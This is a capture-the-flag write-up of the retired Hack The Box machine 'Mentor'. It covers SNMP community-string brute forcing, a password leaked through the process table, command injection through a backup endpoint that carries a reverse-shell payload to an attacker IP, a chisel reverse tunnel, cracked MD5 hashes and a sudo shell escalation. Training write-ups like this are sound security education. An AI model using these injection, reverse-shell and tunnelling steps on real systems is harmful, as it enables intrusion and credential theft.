---
layout: post
title: "The Machine That Talked Too Much"
subtitle: "HTB Mentor, where a chatty monitoring service reads you a password off a running process, and a backup button runs whatever you bring it"
date: 2023-03-18 12:00:00 +0000
description: "A monitoring service that answers a second name reads a password straight off a running process, and a backup endpoint runs whatever path you hand it."
image: /assets/og/the-machine-that-talked-too-much.png
tags: [hackthebox, writeup]
---

Mentor is a quotes site, and the whole box is about a machine that cannot keep its mouth shut. There is a monitoring service whose entire job is to answer questions about itself, and once you learn its second, quieter name, it happily reads you the command line of a running process with a password sitting right there in the arguments. That password opens an admin API. The API has a backup button that takes a path and, if you write that path like a sentence with a semicolon in it, runs the rest as a command. From there it is a container, a database, a reused password, and finally a config file that hands you root in plaintext. Nobody breaks anything on Mentor. The box just keeps telling you secrets, in order, and you keep writing them down.

```
        M E N T O R   Q U O T E S
        =========================
        snmp ?  "who are you"   public  →  not much
        snmp ?  "who are you"   internal →  "oh, EVERYTHING"
                 |
                 v   reads a running process out loud,
                     password still in the arguments
                 |
        /admin/backup  { "path": ";  do this  ;" }
                 the button runs your sentence.
                 |
                 v
        a container, a db, a reused word,
        a config file that just says the password.
                                            言
```

## 0x01 · the front desk

`nmap` is short and tells you the shape of the thing right away. SSH, a web server fronted by uvicorn, and the port that makes this box what it is.

```
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp  open  http    Apache httpd 2.4.52 (+ uvicorn)
161/udp open  snmp    net-snmp; SNMPv1/v3
```

The site at `mentorquotes.htb` is a brochure for an inspirational-quotes app. Fuzz for subdomains and `api.mentorquotes.htb` falls out, a FastAPI backend with the developer's own Swagger docs sitting at `/docs`. That page is a gift. It names an admin, `james@mentorquotes.htb`, and it lists an `/admin/backup` route that you have no token to call yet. Hold both of those. The web side is a locked door with the key taped to the back, and the key is on UDP 161.

## 0x02 · the service that answers to two names

SNMP is the Simple Network Management Protocol, and it is exactly what it says. It is the language machines use to ask each other "how are you feeling, how much memory, what are you running." To ask, you need a community string, which is really just a shared password that gates the conversation. Almost every box on Earth answers to `public`, the factory default, and `public` here gives you the boring stuff.

But community strings are not one per box. An admin can set up several, each with its own view, and they are easy to forget about. Picture a building intercom where pressing one buzzer gets you the lobby, but there is a second, unlabeled buzzer that someone wired straight into the manager's office and never took out. You just have to try the buzzers. `onesixtyone` is the usual tool but it only speaks SNMPv1, and this box wants v2c, so reach for a brute-forcer that does both.

```
$ snmpbrute.py -t 10.10.11.193
[+] 10.10.11.193 : 161   Version (v2c):  public
[+] 10.10.11.193 : 161   Version (v2c):  internal
```

`internal` is the manager's buzzer. With it, walk the host's process table, the part of SNMP that lists every running command exactly as it was typed, arguments and all.

```
$ snmpbulkwalk -v2c -c internal 10.10.11.193 \
    NET-SNMP-EXTEND-MIB::nsExtendObjects
...
HOST-RESOURCES-MIB::hrSWRunParameters."login.py" = STRING: "... kj23sadkj123as0-d213"
```

There it is, naked in the arguments of `login.py`. A password, `kj23sadkj123as0-d213`, read aloud by a service whose only job was to describe the machine honestly. The lesson is quiet and brutal. Anything you pass on a command line is visible to anything that can read the process table, and SNMP can read the process table.

## 0x03 · the button that runs your sentence

Take that password back to the API. `POST /auth/login` as `james` returns a JWT, the signed token that proves to the API who you are. This particular API wants the raw token, no `Bearer` ceremony, and once you carry it, `/admin/backup` opens.

The backup endpoint takes a JSON body with a `path` to back up. Watch what happens when the server builds its backup command by gluing your path into a shell string. If your path is a normal folder, fine. If your path is `; something ;`, the shell finishes the intended command, then reads your `something` as a fresh instruction. This is command injection, the same disease as every injection bug. The program could not tell where your data ended and its own commands began.

Think of it like writing a memo for the mailroom that says "deliver to room 4," but you write "deliver to room 4. Also, unlock the vault." The clerk reads the whole line and does both, because you handed them a sentence and they were only ever going to read it straight through.

```
POST /admin/backup HTTP/1.1
Host: api.mentorquotes.htb
Authorization: <james-jwt>
Content-Type: application/json

{ "path": ";  [ python reverse shell back to 10.10.14.4 on 443 ]  ;" }
```

Start a listener, fire the request, and a shell drops in. The catch is where you land.

```
$ nc -lvnp 443
connect from 10.10.11.193
# id
uid=0(root)  gid=0(root)
# hostname -I
172.22.0.3
```

`root`, which feels like a win for about three seconds, until `172.22.0.3` reminds you this is root inside a Docker container, a sealed room with its own little network. Root of a broom closet is not root of the building.

## 0x04 · the closet has a phone line

Containers are walled gardens, but they almost always keep a phone to the host so the app can reach its database. Read the app source and the number is written on the wall.

```
# cat /app/app/db.py
... postgresql://postgres:postgres@172.22.0.1/mentorquotes_db
```

`172.22.0.1` is the host as seen from inside the closet, and `postgres:postgres` is the database login, default on both sides. The database does not answer from your attacker box though, only from inside that container network. So you build a tunnel. `chisel` is the tool of choice here, a little program that drills a tube from your machine through the container and pops a port out the other end, so your local `psql` can dial the host's database as if it were next door.

```
# attacker
$ chisel server -p 8000 --reverse
# inside the container
# ./chisel client 10.10.14.4:8000 R:5432:172.22.0.1:5432
```

Now `psql -h 127.0.0.1 -U postgres` lands on `mentorquotes_db`, and the `users` table holds what user tables always hold.

```
mentorquotes_db=# select email, password from users;
 svc@...    | 53f22d0dfa10dce7e29cd31f4f953fd8
 james@...  | 7ccdcd8c05b59add9c198d492b36a503
```

Two raw MD5 hashes, unsalted, which in 2023 is like locking a safe and taping the combination to the lid. Feed `svc`'s hash to a cracker or a lookup table and it folds instantly into `123meunomeeivani`. That username, `svc`, is a real account on the actual host, not the container. SSH in.

```
$ ssh svc@10.10.11.193
svc@mentor:~$ cat user.txt
████████████████████████████████
```

## 0x05 · the config file that just tells you

`svc` is an ordinary user. The root step is the quietest move on the whole box, and you find it by reading the one file SNMP always leaves lying around. The service that talked too much on port 161 has to be configured somewhere, and that somewhere is `/etc/snmp/snmpd.conf`.

```
svc@mentor:~$ cat /etc/snmp/snmpd.conf
...
createUser bootstrap MD5 SuperSecurePassword123__ DES
```

That line provisions an SNMPv3 user with a password sitting in the file in plaintext, `SuperSecurePassword123__`. On its own it is just an SNMP credential. But people reuse passwords the way they reuse a favorite mug, and this one was also handed to the local `james` account. Switch to him and check what he is allowed to do.

```
svc@mentor:~$ su james
Password: SuperSecurePassword123__
james@mentor:~$ sudo -l
User james may run the following commands on mentor:
    (ALL) /bin/sh
```

`james` can run `/bin/sh` as anyone, which is the entire keyring. There is nothing left to exploit.

```
james@mentor:~$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

Mentor never gets broken into. It gets *read out loud*. Every step is a secret that was written down somewhere it should not have been, and the box just walks you from one to the next. A password in a process argument, where any monitoring service can see it. A second SNMP community string nobody pruned. A database login that was `postgres:postgres` on both ends. Unsalted MD5 in the users table. A plaintext password in a config file, reused for a login account that had `sudo /bin/sh`. None of those is a clever bug. Each one is a place where a secret leaked into something that talks.

The command injection is the only "real" vulnerability in the classic sense, and even it is the oldest mistake there is, a program that glued your input into a command and could not tell the two apart. But it would not have mattered without the SNMP leak that fed it a token. That is the shape of most real compromises. There is rarely one magnificent exploit. There is a password on a command line, a default left in place, a credential reused once too often, and a quiet service that answers honestly to anyone who learns its second name. The fix is not a patch. The fix is to assume every secret you write down will eventually be read by someone you did not invite, and to stop writing them down where the machine can recite them.

## 0x07 · outro

```
the monitor answered to a name nobody remembered setting.
it read a password off a process, plain as a price tag.
the backup button ran the sentence you handed it.
a reused word and a config file did the rest.

nothing here was forced. it was all just left out loud.

mind the second buzzer. salt the hash. wear black.

                                                            EOF
```

---

*HTB: Mentor, retired 11 Mar 2023. A medium Linux box that is really a lecture on leaked secrets, told by a monitoring service that could not stop talking. The buzzers still answer in a lab and nowhere you don't own.*